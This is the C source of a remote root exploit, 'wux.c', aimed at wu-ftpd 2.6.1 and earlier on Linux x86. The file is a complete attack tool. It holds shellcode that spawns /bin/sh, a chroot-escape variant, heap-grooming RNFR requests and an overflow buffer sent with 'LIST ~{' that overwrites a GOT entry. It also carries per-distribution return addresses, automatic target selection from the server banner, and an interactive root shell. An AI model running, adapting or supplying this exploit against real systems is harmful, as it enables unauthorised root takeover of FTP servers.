/*
 * wux.c - linux x86 wuftpd <= 2.6.1 remote root exploit 
 * written by bind <bind@insidiae.org> 
 * january 10th, 2002
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE, DO NOT DISTRIBUTE
 * 
 * usage: ./wux [-u <user>] [-p <pass>] [-t <version>] [-c] target
 *      -u       username to login to ftp server
 *      -p       password to login to ftp server
 *      -t       target wuftpd version -t0 for list
 *      -a       perform auto-exploitation via banner matching
 *      -c       break chroot jail on linux kernels > 2.4.7
 *      target   host running vulnerable wuftpd
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define _zero(x) memset(&(x), 0, sizeof(x));
#define _death(a) do{ perror(#a "()"); exit(-1); }while(0)

unsigned char readcode[] =
  "\x90\x90\x90\x90\x33\xdb\xf7\xe3\xb0\x03\x8b\xcc\x68\xb2\xff\xcd"
  "\x80\xff\xe4\xeb\xec";

const unsigned char shellcode[] = 
  "\x31\xdb"                            /* xorl %ebx, %ebx       */
  "\x8d\x43\x17"                        /* leal 0x17(%ebx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x31\xd2"                            /* xorl %edx, %edx       */
  "\x52"                                /* pushl %edx            */
  "\x6a\x41"                            /* push $0x41            */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x66\xb9\xed\x01"                    /* movw $0x1ed, %cx      */
  "\x8d\x42\x27"                        /* leal 0x27(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x8d\x42\x3d"                        /* leal 0x3d(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x31\xf6"                            /* xorl %esi, %esi       */
  "\x52"                                /* pushl %edx            */
  "\x68\x2e\x2e\x2f\x2f"                /* pushl $0x2f2f2e2e     */
  "\x46"                                /* incl %esi             */
  "\x83\xfe\x10"                        /* cmpl $0x10, %esi      */
  "\x7c\xf5"                            /* jl <loop>             */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x8d\x42\x3d"                        /* leal 0x3d(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x52"                                /* pushl %edx            */
  "\x6a\x41"                            /* push $0x41            */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x8d\x42\x28"                        /* leal 0x28(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x52"                                /* pushl %edx            */
  "\x68\x2f\x2f\x73\x68"                /* pushl $0x68732f2f     */
  "\x68\x2f\x62\x69\x6e"                /* pushl $0x6e69622f     */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x52"                                /* pushl %edx            */
  "\x53"                                /* pushl %ebx            */
  "\x89\xe1"                            /* movl %esp, %ecx       */
  "\x8d\x42\x0b"                        /* leal 0xb(%edx), %eax  */
  "\xcd\x80";                           /* int $0x80             */

const unsigned char neo_chroot[] =
  "\x31\xdb"                            /* xorl %ebx, %ebx       */
  "\x8d\x43\x17"                        /* leal 0x17(%ebx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x31\xd2"                            /* xorl %edx, %edx       */
  "\x52"                                /* pushl %edx            */
  "\x68\x2e\x2e\x2e\x2e"                /* pushl $0x2e2e2e2e     */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x66\xb9\xed\x01"                    /* movw $0x1ed, %cx      */
  "\x8d\x42\x27"                        /* leal 0x27(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x8d\x42\x3d"                        /* leal 0x3d(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x31\xf6"                            /* xorl %esi, %esi       */
  "\x52"                                /* pushl %edx            */
  "\x66\x68\x2e\x2e"                    /* pushw $0x2e2e         */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x8d\x42\x0c"                        /* leal 0xc(%edx), %eax  */
  "\xcd\x80"                            /* int $0x80             */
  "\x52"                                /* pushl %edx            */
  "\x6a\x2e"                            /* push $0x2e            */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x83\xec\x58"                        /* subl $0x58, %ecx      */
  "\x89\xe1"                            /* movl %esp, %ecx       */
  "\x8d\x42\x6a"                        /* leal 0x6a(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x8b\x79\x04"                        /* movl 0x4(%ecx), %edi  */
  "\x83\xff\x02"                        /* cmpl $0x2, %edi       */
  "\x74\x06"                            /* je <hacked>           */
  "\x46"                                /* incl %esi             */
  "\x83\xfe\x64"                        /* cmpl $0x64, %esi      */
  "\x7c\xd7"                            /* jl <loop>             */
  "\x52"                                /* pushl %edx            */
  "\x6a\x2e"                            /* push $0x2e            */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x8d\x42\x3d"                        /* leal 0x3d(%edx), %eax */
  "\xcd\x80"                            /* int $0x80             */
  "\x52"                                /* pushl %edx            */
  "\x68\x2f\x2f\x73\x68"                /* pushl $0x68732f2f     */
  "\x68\x2f\x62\x69\x6e"                /* pushl $0x6e69622f     */
  "\x89\xe3"                            /* movl %esp, %ebx       */
  "\x52"                                /* pushl %edx            */
  "\x53"                                /* pushl %ebx            */
  "\x89\xe1"                            /* movl %esp, %ecx       */
  "\x8d\x42\x0b"                        /* leal 0xb(%edx), %eax  */
  "\xcd\x80";                           /* int $0x80             */

char ftp_banner[1024];

typedef struct target_s
{
  unsigned long retloc;		/* address to overwrite in GOT             */
  unsigned long cbuf;		/* cbuf addr needed rarely, take cbuf + 33 */
  const unsigned char *code;	/* ptr to shellcode to use                 */
  char *name;			/* name of the vulnerable wuftpd           */
  char *banner;			/* wuftpd banner for auto-exploitation     */
}
target_t;

const target_t target[] = {
  {0x08072b24, 0x00000000, shellcode, "wu-2.6.1-18 redhat 7.2 (Enigma)",
    "Version wu-2.6.1-18"},
  {0x0807314c, 0x00000000, shellcode, "wu-2.6.1-16 redhat 7.1 (Seawolf)",
    "Version wu-2.6.1-16"},
  {0x08070e4c, 0x00000000, shellcode, "wu-2.6.1(1) redhat 7.0 (Guinness)",
    "Version wu-2.6.1(1) Wed Aug 9 05:54:50 EDT 2000"},
  {0x080705a0, 0x080833f1, shellcode, "wu-2.6.0(1) redhat 6.2 (Zoot)",
    "Version wu-2.6.0(1) Fri Jun 23 09:17:44 EDT 2000"},
  {0x0806e1a0, 0x00000000, shellcode, "wu-2.6.0(1) redhat 6.2 (Zoot) default",
    "Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 2000"},
  {0x0806cb88, 0x00000000, shellcode, "wu-2.5.0(1) redhat 6.1 (Cartman)",
    "Version wu-2.5.0(1) Tue Sep 21 16:48:12 EDT 1999"},
  {0x0806de74, 0x00000000, shellcode, "wu-2.6.0(1) slackware 7.1.0", NULL},
  {0x0806d30c, 0x00000000, shellcode, "wuftpd nudge", NULL},
};

const target_t *mytarget;

const int targetc = sizeof(target) / sizeof(*target);

void usage(char *);
void manip_free(int);
int connection(char *);
int login(int, char *, char *);
int dornfr(int, int);
int escape_ff(u_char *, u_char *);
int shell(int);
unsigned long resolve(char *);

int main(int argc, char **argv)
{
  int i, opt, sockfd, ae = 0, ver = 0, nchroot = 0;
  char *prog, *victim, *user, *pass;

  setvbuf(stdout, NULL, _IONBF, 0);

  printf("wux.c - linux x86 wuftpd <= 2.6.1 remote root exploit\n");
  printf("written by bind <bind@insidiae.org>\n");

  user = "ftp";
  pass = "user@";
  prog = argv[0];

  opterr = 0;
  while ((opt = getopt(argc, argv, "u:p:t:ac")) != EOF) {
    switch (opt) {
     case 'u':
       user = optarg;
       break;
     case 'p':
       pass = optarg;
       break;
     case 't':
       ver = atoi(optarg) - 1;
       break;
     case 'a':
       ae = 1;
       ver = 0;
       break;
     case 'c':
       nchroot = 1;
       break;
     default:
       usage(prog);
       break;
    }
  }

  argv += optind;
  victim = argv[0];

  if (ver < 0 || ver >= targetc) {
    printf("\ntargets:\n");
    for (i = 0; i < targetc; i++)
      printf("  -t%d  %s\n", i + 1, target[i].name);
    exit(0);
  }

  if (!victim)
    usage(prog);

  mytarget = target + ver;

  if ((sockfd = connection(victim)) < 0) {
    printf("connection failed\n");
    exit(-1);
  }

  if (ae) {
    ver = 1;
    for (i = 0; target[i].banner != NULL; i++)
      if (strstr(ftp_banner, target[i].banner)) {
	mytarget = target + i;
	ver = -1;
	break;
      }

    if (ver > 0) {
      printf("\nauto-exploitation failed. unknown banner:\n%s", ftp_banner);
      exit(-1);
    }
  }

  printf("\nexploiting %s\n", mytarget->name);
  
  if(!nchroot)
    printf("using %d byte shellcode\n\n", strlen(mytarget->code));
  else
    printf("using %d byte shellcode\n\n", strlen(neo_chroot));
  
  printf("connected to %s\n", victim);

  if (login(sockfd, user, pass) < 0) {
    printf("FATAL: login failed\n");
    exit(-1);
  }

  printf("login successful (%s/%s)\n", user, pass);

  readcode[26] = strlen(mytarget->code);

  manip_free(sockfd);

  if(!nchroot)
    write(sockfd, mytarget->code, strlen(mytarget->code));
  else
    write(sockfd, neo_chroot, strlen(neo_chroot));

  sleep(1);

  if (shell(sockfd) < 0)
    puts("exploit failed");

  close(sockfd);
  exit(0);
}

void manip_free(int sd)
{
  int i, n, size = 0;
  char buf[2048], tmp[2048];

  _zero(buf);

  for (i = 0; i < 145; i++) {
    size += 1 * i;
    printf("populating heap (%.2f Kb)\r", (double) size / 1024.0);
    dornfr(sd, 1);
  }
  for (i = 0; i < 20; i++) {
    size += 100 * i;
    printf("populating heap (%.2f Kb)\r", (double) size / 1024.0);
    dornfr(sd, 100);
  }

  putchar('\n');

  sprintf(buf, "CWD ~{");
  for (i = 0; i < 21; i++)
    strcat(buf, ",");
  strcat(buf, "}/\r\n");

  write(sd, buf, strlen(buf));
  sleep(1);

  n = read(sd, buf, sizeof(buf));
  if (n == -1)
    _death(read);

  _zero(buf);

#ifdef DEBUG
  printf("press enter to send read() shellcode");
  getchar();
#endif

  puts("sending read() shellcode");

  sprintf(buf, "LIST ~{");

  for (i = 7; i < 450; i += 4)
    *(long *) &buf[i] = 0xffffffff;

  *(long *) &buf[365] = 0xffffffb0;
  *(long *) &buf[369] = 0xffffffb0;

  *(long *) &buf[285 + 32 - 24] = 0xfcebf0eb;

  for (i = 37; i < 285; i += 2)
    *(short *) &buf[i] = 0xfceb;

  for (i = 297; i < 309; i += 4)
    *(long *) &buf[i] = 0xfcebfceb;

  memcpy(buf + 38, readcode, strlen(readcode));

  *(long *) &buf[441] = 0x11111111;
  *(long *) &buf[445] = 0xfffffffc;
  *(long *) &buf[449] = 0xfffffffc;
  *(long *) &buf[453] = mytarget->retloc - 12;

  if (mytarget->cbuf)
    *(long *) &buf[457] = mytarget->cbuf;

  strcat(buf, "\r\n");
  escape_ff(buf, tmp);

  write(sd, tmp, strlen(tmp));
  sleep(1);

}

int escape_ff(u_char * src, u_char * dst)
{
  do {
    if (*src == 0xff)
      *dst++ = *src;
    *dst++ = *src;
  } while (*src++);

  return (strlen(dst));
}

int dornfr(int sd, int len)
{
  char buf[2048], dirname[len * 2];
  int n;

  dirname[0] = '.';

  for (n = 1; n < len; n++)
    dirname[n] = (n % 2 == 0) ? '.' : '/';

  dirname[len] = '\0';

  snprintf(buf, sizeof(buf), "RNFR %s\r\n", dirname);

  n = write(sd, buf, strlen(buf));
  if (n != (signed) strlen(buf))
    _death(write);

  n = read(sd, buf, sizeof(buf));
  if (n == -1)
    _death(read);

  return (0);
}

int connection(char *host)
{
  int sockfd;
  struct sockaddr_in sin;

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    return (-1);

  sin.sin_port = htons(21);
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = resolve(host);

  if (connect(sockfd, (struct sockaddr *) &sin, sizeof(sin)) < 0)
    return (-1);

  read(sockfd, ftp_banner, sizeof(ftp_banner));

  return (sockfd);
}

int login(int sd, char *user, char *pass)
{
  char sendbuf[1024], recvbuf[1024];

  _zero(sendbuf);
  snprintf(sendbuf, sizeof(sendbuf), "USER %s\r\n", user);
  write(sd, sendbuf, strlen(sendbuf));

  read(sd, recvbuf, sizeof(recvbuf));

  _zero(sendbuf);
  snprintf(sendbuf, sizeof(sendbuf), "PASS %s\r\n", pass);
  write(sd, sendbuf, strlen(sendbuf));

  read(sd, recvbuf, sizeof(recvbuf));

  if (strstr(recvbuf, "230"))
    return (0);

  return (-1);
}

void usage(char *name)
{
  printf("usage: %s [-u <user>] [-p <pass>] [-t <version>] [-c] target\n"
    "       -u\tusername to login to ftp server\n"
    "       -p\tpassword to login to ftp server\n"
    "       -t\ttarget wuftpd version -t0 for list\n"
    "       -a\tperform auto-exploitation via banner matching\n"
    "       -c\tbreak chroot jail on linux kernels > 2.4.7\n"
    "       target\thost running vulnerable wuftpd\n", name);
  exit(-1);
}

int forward(int from, int to)
{
  char data[1024];
  int n, m;

  n = read(from, data, sizeof(data));
  if (!n)
    return (-1);
  if (n == -1)
    _death(read);
  m = write(to, data, n);
  if (m != n)
    _death(write);
  return (0);
}

int shell(int sd)
{
  const char cmd[] = "/bin/uname -a; /usr/bin/id\n";

  char data[1024];
  fd_set set;
  int n, i;

  putchar('\n');

  n = write(sd, "/usr/bin/id\n", 12);
  if (n != 12) {
    perror("write()");
    return(-1);
  }

  n = read(sd, data, sizeof(data));
  if (n == -1) {
    perror("read()");
    return (-1);
  }

  if (!strstr(data, "uid=0"))
    return (-1);

  n = write(sd, cmd, strlen(cmd));
  if (n != (signed) strlen(cmd)) {
    perror("write()");
    return(-1);
  }

  for(i = 0; i < 2; i++) {
    _zero(data);
    n = read(sd, data, sizeof(data));
    if (n == -1) {
      perror("read()");
      return (-1);
    }
    data[n] = '\0';
    write(1, data, n);
  }


  for (;;) {
    FD_ZERO(&set);
    FD_SET(0, &set);
    FD_SET(sd, &set);

    n = select(sd + 1, &set, NULL, NULL, NULL);
    if (n == -1)
      _death(select);

    if (FD_ISSET(0, &set))
      if (forward(0, sd))
        break;

    if (FD_ISSET(sd, &set))
      if (forward(sd, 1))
        break;
  }
  return (1);
}

u_long resolve(char *hostname)
{
  struct sockaddr_in sin;
  struct hostent *hent;

  if(!(hent = gethostbyname(hostname)))
    return(0);

  bzero((char *) &sin, sizeof(sin));
  memcpy((char *) &sin.sin_addr, hent->h_addr, hent->h_length);

  return(sin.sin_addr.s_addr);
}
